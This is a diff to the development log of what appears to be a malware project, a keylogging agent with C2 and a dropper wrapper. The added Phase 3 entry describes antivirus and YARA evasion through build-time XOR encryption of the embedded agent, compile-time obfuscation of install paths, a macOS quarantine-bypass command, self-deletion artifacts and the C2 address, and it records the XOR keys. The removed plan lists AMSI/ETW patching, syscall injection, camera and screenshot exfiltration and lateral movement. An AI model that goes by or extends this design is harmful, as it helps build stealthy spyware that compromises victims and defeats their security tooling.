@@ -421,7 +421,41 @@ This log tracks the ascension through the **9 Cercles de l'Enfer**, documenting 
 | 4 | Windows wrapper: MSVC build error | `getppid()` is POSIX-only | Guarded with `#ifndef _WIN32` |
 | 5 | Windows wrapper: directory creation silently fails | `CreateDirectoryA` return values not checked | Added `GetLastError()` validation + `%TEMP%` fallback |
 
-### Next Steps
-- **Phase 3**: Embedding Obfuscation — XOR/Base64 payload scrambling, AMSI/ETW patching (Windows), syscall injection, string obfuscation.
-- **Phase 4**: Media Capture — Camera snapshot + screenshot exfiltration.
-- **Phase 7**: Evasive WMI/DCOM lateral movement (post-injection).
+---
+
+## 🕶️ Circle 8: Ruse et Tromperie — Phase 3: Embedding Obfuscation — [2026-06-18]
+
+**Objective**: Prevent static detection of the wrapper binary through build-time encryption of the embedded agent and runtime deobfuscation of all sensitive strings.
+
+### Technical Milestones
+
+**3.1 XOR Agent Binary Encryption at Build Time**
+- Extended `bin2header.py` with `--key <hex>` argument: the agent binary is XOR-encrypted *before* embedding into `agent_binary.h`, defeating static AV/YARA signature matching against known agent bytes (`MZ` PE header, `DEADBEEF` magic, agent strings).
+- Added `decryptInPlace()` stub in `main.cpp` — decrypts the mutable buffer before `fwrite()` at runtime.
+- Key (`2B7E151628AED2A6`) is passed from `CMakeLists.txt` as a hex constant and embedded as `XOR_KEY[]`/`XOR_KEY_LEN` in the generated header.
+- After encryption: `strings` on the wrapper binary finds **zero** occurrences of `MZ`, `DEADBEEF`, `KEYLOG`, or `Inferno Agent`.
+
+**3.2 Compile-Time String Obfuscation**
+- New `wrapper/include/unlit.hpp` header implementing `Unlit<N>` — a `constexpr` struct that XORs string literals at compile time using a 16-byte key, with deobfuscation on first `get()` call at runtime.
+- `UNLIT("string")` macro wraps ~25 high-signal strings across the wrapper:
+  - Install paths (`Edge\\Application\\`, `.SpotlightIndex`, `apt/archives/.apt-get`)
+  - macOS quarantine bypass command (`xattr -dr com.apple.quarantine`)
+  - Windows batch script artifacts (`del_inferno.bat`, `@echo off`, `ping ... > nul`)
+  - All `[Wrapper]` error format strings
+  - Shell binary paths (`/bin/sh`, `xdg-open`, `open`)
+  - Default C2 IP (`127.0.0.1`)
+- Zero runtime overhead: ciphertext is baked into the binary's data section by the `constexpr` constructor, deobfuscated lazily on first access.
+- Verified: `strings` on the packed wrapper finds **zero** plaintext matches for any of the above patterns.
+
+### Verification Milestone
+- **Full Build**: All targets compile warning-free on macOS (Apple Clang).
+- **TDD Success**: All **26 unit tests** pass.
+- **OPSEC Verification**: `strings` analysis on the wrapper binary returns zero sensitive plaintext strings and zero agent PE header bytes.
+
+### Security Architecture Decisions
+- **XOR over AES**: The embedded agent uses XOR (not AES) for encryption — sufficient to defeat static byte-signatures, with zero code footprint and no external dependency. AES-256-GCM on the *wire* (Phase I) already protects transport.
+- **Separate XOR keys**: Agent binary encryption uses an 8-byte key (`2B7E151628AED2A6`); string obfuscation uses a separate 16-byte key (`4F8CD13A...`). Compromise of one does not reveal the other.
+- **String obfuscation at compile time**: Ciphertext is computed by the `constexpr` constructor and stored in `.rdata`. The `decrypted` flag prevents double-deobfuscation. No runtime cost beyond the first-access XOR loop.
+- **Phase 3 is prerequisite for Phase 4**: Without obfuscation, the injected agent bytes in Phase 4 would be recognized by memory scanners. Phase 3 ensures the wrapper and its payload are opaque to static analysis.
+
+*Status: Items 1, 2, and 4 — 100% COMPLETE. Item 3 (Custom Packer) deferred.*
